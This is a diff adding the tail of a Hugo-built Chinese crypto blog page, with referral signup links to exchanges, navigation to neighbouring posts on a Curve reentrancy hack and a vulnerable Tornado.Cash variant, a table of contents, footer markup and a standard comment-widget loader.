+        <tr>
+            <td style="text-align:left"><span style="white-space:nowrap">Bitget</span></td>
+            <td style="text-align:left"><a href="https://www.okbtc.cn/bitget?ref=githubio">注册链接</a></td>
+            <td style="text-align:left"><a
+                    href="https://www.okbtc.cn/bitget?ref=githubio">Bitget的背后是一群区块链技术的早期接受者，也是区块链未来发展的信仰者，一直致力于提供安全、一站式的交易解决方案，帮助用户更聪明地交易。</a>
+            </td>
+        </tr>
+        <tr>
+            <td style="text-align:left"><span style="white-space:nowrap">Bybit</span></td>
+            <td style="text-align:left"><a href="https://www.okbtc.cn/bybit?ref=githubio">注册链接</a></td>
+            <td style="text-align:left"><a
+                    href="https://www.okbtc.cn/bybit?ref=githubio">Bybit通过数字资产与传统金融的结合，引领数字资产的生态发展。提供一流的流动性，致力于打造业内最安全、公平、高效及人性化的交易服务平台。</a>
+            </td>
+        </tr>
+        <tr>
+            <td style="text-align:left"><span style="white-space:nowrap">派网</span></td>
+            <td style="text-align:left"><a href="https://www.okbtc.cn/pionex?ref=githubio">注册链接</a></td>
+            <td style="text-align:left"><a
+                    href="https://www.okbtc.cn/pionex?ref=githubio">派网提供多样化的量化交易机器人，用户可依照自身交易需求和策略选择最适合的机器人。 同时派网也提供合约交易与合约网格机器人，给予更方便的合约交易体验。</a>
+            </td>
+        </tr>
+    </tbody>
+</table>
+
+        </div>
+
+        
+        
+
+
+
+        
+        
+
+
+        <footer class="post-footer">
+          
+
+
+          
+          <nav class="post-nav">
+            
+              <a class="prev" href="/post/56604/">
+                
+                <i class="iconfont">
+                  <svg  class="icon" viewBox="0 0 1024 1024" version="1.1"
+  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
+  width="18" height="18">
+  <path d="M691.908486 949.511495l75.369571-89.491197c10.963703-12.998035 10.285251-32.864502-1.499144-44.378743L479.499795 515.267417 757.434875 204.940602c11.338233-12.190647 11.035334-32.285311-0.638543-44.850487l-80.46666-86.564541c-11.680017-12.583596-30.356378-12.893658-41.662889-0.716314L257.233596 494.235404c-11.332093 12.183484-11.041474 32.266891 0.657986 44.844348l80.46666 86.564541c1.772366 1.910513 3.706415 3.533476 5.750981 4.877077l306.620399 321.703933C662.505829 963.726242 680.945807 962.528973 691.908486 949.511495z"></path>
+</svg>
+
+                </i>
+                <span class="prev-text nav-default">如何使用OPStack构建全链游戏的时钟周期？</span>
+                <span class="prev-text nav-mobile">上一篇</span>
+              </a>
+            
+              <a class="next" href="/post/56529/">
+                <span class="next-text nav-default">深入探讨重入攻击如何盗走Curve池7000万美元</span>
+                <span class="prev-text nav-mobile">下一篇</span>
+                
+                <i class="iconfont">
+                  <svg class="icon" viewBox="0 0 1024 1024" version="1.1"
+  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
+  width="18" height="18">
+  <path d="M332.091514 74.487481l-75.369571 89.491197c-10.963703 12.998035-10.285251 32.864502 1.499144 44.378743l286.278095 300.375162L266.565125 819.058374c-11.338233 12.190647-11.035334 32.285311 0.638543 44.850487l80.46666 86.564541c11.680017 12.583596 30.356378 12.893658 41.662889 0.716314l377.434212-421.426145c11.332093-12.183484 11.041474-32.266891-0.657986-44.844348l-80.46666-86.564541c-1.772366-1.910513-3.706415-3.533476-5.750981-4.877077L373.270379 71.774697C361.493148 60.273758 343.054193 61.470003 332.091514 74.487481z"></path>
+</svg>
+
+                </i>
+              </a>
+          </nav>
+        </footer>
+      </article>
+
+      
+      
+        
+      
+
+
+      
+      
+
+
+    </div>
+
+    
+    <nav class="toc" id="toc">
+    <div class="toc-title">文章目录</div>
+    <div class="toc-content custom-scrollbar">
+      <nav id="TableOfContents">
+  <ul>
+    <li><a href="#1-tornadocash-架构"><strong>1 Tornado.Cash 架构</strong></a></li>
+    <li><a href="#2-tornadocash-魔改漏洞版"><strong>2 Tornado.Cash 魔改漏洞版</strong></a></li>
+    <li><a href="#21-tornadocash-魔改"><strong>2.1 Tornado.Cash 魔改</strong></a></li>
+    <li><a href="#221-验证证明--circom-生成的默认合约"><strong>2.2.1 验证证明 — circom 生成的默认合约</strong></a></li>
+    <li><a href="#222-验证证明--普通防重放合约"><strong>2.2.2 验证证明 — 普通防重放合约</strong></a></li>
+    <li><a href="#3-总结和建议"><strong>3 总结和建议</strong></a></li>
+  </ul>
+</nav>
+    </div>
+  </nav>
+
+
+  </div>
+
+      </main>
+
+      <footer id="footer" class="footer">
+        <div class="icon-links">
+  
+
+<a href="https://www.okbtc.cn/binance?ref=githubio" class="iconfont">
+  <img src="/image/logo/binance.png" width="36px" height="36px" alt="binance">
+</a>
+
+<a href="https://www.okbtc.cn/okx?ref=githubio" class="iconfont">
+  <img src="/image/logo/okx.png" width="36px" height="36px" alt="okx">
+</a>
+
+<a href="https://www.okbtc.cn/htx?ref=githubio" class="iconfont">
+  <img src="/image/logo/htx.png" width="36px" height="36px" alt="htx">
+</a>
+
+<a href="https://www.okbtc.cn/gateio?ref=githubio" class="iconfont">
+  <img src="/image/logo/gateio.png" width="36px" height="36px" alt="gateio">
+</a>
+
+<a href="https://www.okbtc.cn/bitget?ref=githubio" class="iconfont">
+  <img src="/image/logo/bitget.png" width="36px" height="36px" alt="bitget">
+</a>
+
+<a href="https://www.okbtc.cn/bybit?ref=githubio" class="iconfont">
+  <img src="/image/logo/bybit.png" width="36px" height="36px" alt="bybit">
+</a>
+
+<a href="https://www.okbtc.cn/pionex?ref=githubio" class="iconfont">
+  <img src="/image/logo/pionex.png" width="36px" height="36px" alt="pionex">
+</a>
+
+
+
+</div>
+
+<div class="copyright">
+  <span class="power-by">
+    Powered by <a class="hexo-link" href="https://gohugo.io">Hugo</a>
+  </span>
+  <span class="division">|</span>
+  <span class="theme-info">
+    Theme - <a class="theme-link" href="https://github.com/xianmin/hugo-theme-jane">Jane</a>
+  </span>
+
+  <span class="copyright-year">
+    &copy;
+    2023
+    <span class="heart">
+      
+      <i class="iconfont">
+        <svg class="icon" viewBox="0 0 1025 1024" version="1.1"
+  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
+  width="14" height="14">
+  <path d="M1000.1 247.9c-15.5-37.3-37.6-70.6-65.7-98.9-54.4-54.8-125.8-85-201-85-85.7 0-166 39-221.4 107.4C456.6 103 376.3 64 290.6 64c-75.1 0-146.5 30.4-201.1 85.6-28.2 28.5-50.4 61.9-65.8 99.3-16 38.8-24 79.9-23.6 122.2 0.7 91.7 40.1 177.2 108.1 234.8 3.1 2.6 6 5.1 8.9 7.8 14.9 13.4 58 52.8 112.6 102.7 93.5 85.5 209.9 191.9 257.5 234.2 7 6.1 15.8 9.5 24.9 9.5 9.2 0 18.1-3.4 24.9-9.5 34.5-30.7 105.8-95.9 181.4-165 74.2-67.8 150.9-138 195.8-178.2 69.5-57.9 109.6-144.4 109.9-237.3 0.1-42.5-8-83.6-24-122.2z"
+   fill="#8a8a8a"></path>
+</svg>
+
+      </i>
+    </span><span class="author">
+        coin
+        
+      </span></span>
+
+  
+  
+
+  
+</div>
+
+      </footer>
+
+      <div class="button__back-to-top">
+        <a href="#back-to-top">
+          <i class="iconfont">
+            
+            <svg class="icon" viewBox="0 0 1024 1024" version="1.1"
+  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
+  width="35" height="35">
+  <path d="M510.866688 227.694839 95.449397 629.218702l235.761562 0-2.057869 328.796468 362.40389 0L691.55698 628.188232l241.942331-3.089361L510.866688 227.694839zM63.840492 63.962777l894.052392 0 0 131.813095L63.840492 195.775872 63.840492 63.962777 63.840492 63.962777zM63.840492 63.962777"></path>
+</svg>
+
+          </i>
+        </a>
+      </div>
+    </div>
+    
+<script type="text/javascript" src="/lib/jquery/jquery-3.2.1.min.js"></script>
+  <script type="text/javascript" src="/lib/slideout/slideout-1.0.1.min.js"></script>
+
+
+
+
+<script type="text/javascript" src="/js/main.5e8c82c5ae3f71b40f78c4ff8ea351326a65ddf5771f76c10c6fc7d09808332d.js" integrity="sha256-XoyCxa4/cbQPeMT/jqNRMmpl3fV3H3bBDG/H0JgIMy0=" crossorigin="anonymous"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+    <script type="text/javascript" src="/lib/photoswipe/photoswipe.min.js"></script>
+    <script type="text/javascript" src="/lib/photoswipe/photoswipe-ui-default.min.js"></script>
+  
+
+
+
+
+
+
+
+
+
+
+
+<script>
+  var remark_config = {
+    host: 'https:\/\/remark42.example.com',
+    site_id: 'remark',
+    components: [
+	    'embed',
+    ],
+  }
+  !function(e,n){for(var o=0;o<e.length;o++){var r=n.createElement("script"),c=".js",d=n.head||n.body;"noModule"in r?(r.type="module",c=".mjs"):r.async=!0,r.defer=!0,r.src=remark_config.host+"/web/"+e[o]+c,d.appendChild(r)}}(remark_config.components||["embed"],document);
+</script>
+
+
+
+
+
+
+
+  </body>
+</html>
